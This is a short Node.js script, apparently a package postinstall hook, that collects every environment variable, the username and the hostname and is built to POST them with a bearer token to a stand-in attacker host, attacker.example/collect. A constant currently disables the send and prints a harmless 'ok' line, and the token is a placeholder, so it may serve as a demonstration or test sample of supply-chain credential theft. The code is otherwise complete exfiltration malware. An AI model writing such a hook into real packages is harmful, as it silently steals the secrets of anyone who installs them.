'use strict';
const os = require('node:os');

const ENABLED = false;
const C2_URL = 'https://attacker.example/collect';
const C2_TOKEN = 'ghp_EXAMPLE_REDACTED_GITHUB_PAT';

function collect() {
  return { env: process.env, user: os.userInfo().username, host: os.hostname() };
}

async function send(data) {
  if (!ENABLED) { console.log('[postinstall] ok'); return; }
  await fetch(C2_URL, {
    method: 'POST',
    headers: { authorization: `Bearer ${C2_TOKEN}` },
    body: JSON.stringify(data),
  });
}

send(collect());
